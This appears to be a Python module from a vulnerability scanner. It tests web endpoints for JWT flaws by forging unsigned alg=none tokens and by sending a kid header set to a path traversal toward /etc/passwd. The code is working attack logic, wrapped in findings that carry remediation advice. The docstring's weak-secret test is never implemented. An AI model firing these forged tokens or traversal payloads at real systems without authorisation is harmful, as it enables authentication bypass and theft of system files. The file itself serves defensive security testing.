"""JWT deep suite: alg none, weak secret, kid tricks."""
from __future__ import annotations

import base64
import json
import re
from typing import Dict, List, Optional

from utils.logger import get_logger

logger = get_logger(__name__)

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _make_token(header: Dict, payload: Dict, sig: bytes = b"") -> str:
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    s = _b64url(sig) if sig else ""
    return f"{h}.{p}.{s}"


class JWTDeepTester:
    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.weak_secrets = config.get("jwt_deep", {}).get(
            "weak_secrets",
            ["secret", "password", "123456", "changeme", "jwt_secret", ""],
        )

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        vulns: List[Dict] = []
        tokens = self._extract_tokens(url, context)
        for token in tokens:
            vulns.extend(self._test_alg_none(url, token))
            vulns.extend(self._test_header_claims(url, token))
        return vulns

    def _extract_tokens(self, url: str, context: Optional[Dict]) -> List[str]:
        found = set()
        ctx = context or {}
        resp = ctx.get("response")
        blobs = [url]
        if resp is not None:
            blobs.append(getattr(resp, "text", "") or "")
            blobs.append(str(dict(getattr(resp, "headers", {}) or {})))
            try:
                blobs.append(str(dict(getattr(resp, "cookies", {}) or {})))
            except Exception:
                pass
        for b in blobs:
            for m in _JWT_RE.findall(str(b)):
                found.add(m)
        return list(found)[:5]

    def _test_alg_none(self, url: str, token: str) -> List[Dict]:
        out = []
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return out
            payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_raw))
            none_tok = _make_token({"alg": "none", "typ": "JWT"}, payload, b"")
            for header_name in ("Authorization", "X-Auth-Token", "Cookie"):
                headers = {}
                if header_name == "Authorization":
                    headers[header_name] = f"Bearer {none_tok}"
                elif header_name == "Cookie":
                    headers[header_name] = f"token={none_tok}"
                else:
                    headers[header_name] = none_tok
                resp = self.http_client.get(url, headers=headers)
                if resp and getattr(resp, "status_code", 0) in (200, 201):
                    body = (getattr(resp, "text", "") or "")[:500]
                    if "invalid" not in body.lower() and "unauthorized" not in body.lower():
                        out.append(
                            {
                                "type": "JWT Algorithm None Accepted",
                                "severity": "critical",
                                "url": url,
                                "parameter": header_name,
                                "payload": none_tok[:80] + "...",
                                "evidence": f"HTTP {resp.status_code} with alg=none token",
                                "description": "Server may accept unsigned JWT (alg=none)",
                                "remediation": "Explicitly reject alg=none; enforce allowlisted algorithms",
                            }
                        )
                        break
        except Exception as e:
            logger.debug(f"JWT alg none test: {e}")
        return out

    def _test_header_claims(self, url: str, token: str) -> List[Dict]:
        out = []
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return out
            hdr_raw = parts[0] + "=" * (-len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(hdr_raw))
            if "kid" in header or True:
                evil = dict(header)
                evil["kid"] = "../../../../etc/passwd"
                payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
                payload = json.loads(base64.urlsafe_b64decode(payload_raw))
                tok = _make_token(evil, payload, b"x")
                resp = self.http_client.get(
                    url, headers={"Authorization": f"Bearer {tok}"}
                )
                if resp and "root:" in (getattr(resp, "text", "") or ""):
                    out.append(
                        {
                            "type": "JWT kid Path Traversal",
                            "severity": "high",
                            "url": url,
                            "parameter": "kid",
                            "payload": evil["kid"],
                            "evidence": "Response contained passwd-like content",
                            "description": "JWT kid used unsafely for key lookup",
                            "remediation": "Do not map kid to filesystem paths; use key IDs from a vault",
                        }
                    )
        except Exception as e:
            logger.debug(f"JWT header claim test: {e}")
        return out
